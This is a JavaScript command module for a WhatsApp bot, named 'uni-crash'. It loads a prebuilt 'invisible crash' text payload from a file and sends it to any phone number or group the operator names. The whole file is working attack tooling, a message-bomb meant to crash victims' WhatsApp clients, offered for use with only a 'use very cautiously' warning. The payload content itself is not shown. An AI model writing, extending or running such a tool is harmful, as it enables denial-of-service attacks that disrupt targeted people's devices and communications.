import fs from "fs";
import path from "path";

export default {
  name: "uni-crash",
  description: "Send huge single-line invisible crash. Asks for number if not provided.",
  async execute(msg, { sock, args }) {
    try {
      const filePath = path.join(process.cwd(), "bugs", "singleline_crash.txt");

      if (!fs.existsSync(filePath)) {
        return await sock.sendMessage(msg.key.remoteJid, {
          text: "❌ singleline_crash.txt not found in bugs folder. Run `node make_singleline_crash.js` first."
        });
      }

      const payload = fs.readFileSync(filePath, "utf8");

      // If number not provided, ask user to reply
      let target = args[0];
      if (!target) {
        await sock.sendMessage(msg.key.remoteJid, {
          text: "⚠️ Please reply with the number or group ID you want to send the singleline crash to."
        });

        // Wait for reply
        const collected = await sock.ev.on("messages.upsert", async (m) => {
          const incoming = m.messages[0];
          if (incoming.key.fromMe) return; // ignore bot's own messages
          if (incoming.key.remoteJid !== msg.key.remoteJid) return; // ignore others
          target = incoming.message?.conversation || incoming.message?.extendedTextMessage?.text;
          return target;
        });

        if (!target) {
          return await sock.sendMessage(msg.key.remoteJid, {
            text: "❌ No number received. Cancelled."
          });
        }
      }

      // Format target
      if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
        if (target.length < 11) {
          return await sock.sendMessage(msg.key.remoteJid, {
            text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX"
          });
        }
        target = target + "@s.whatsapp.net";
      }

      // Send huge invisible payload
      await sock.sendMessage(target, { text: payload });

      await sock.sendMessage(msg.key.remoteJid, {
        text: `✅ singleline crash sent to ${args[0] || target}. ⚠️ Use very cautiously!`
      });

    } catch (e) {
      await sock.sendMessage(msg.key.remoteJid, {
        text: "❌ Failed to send singleline crash: " + e.message
      });
    }
  }
};
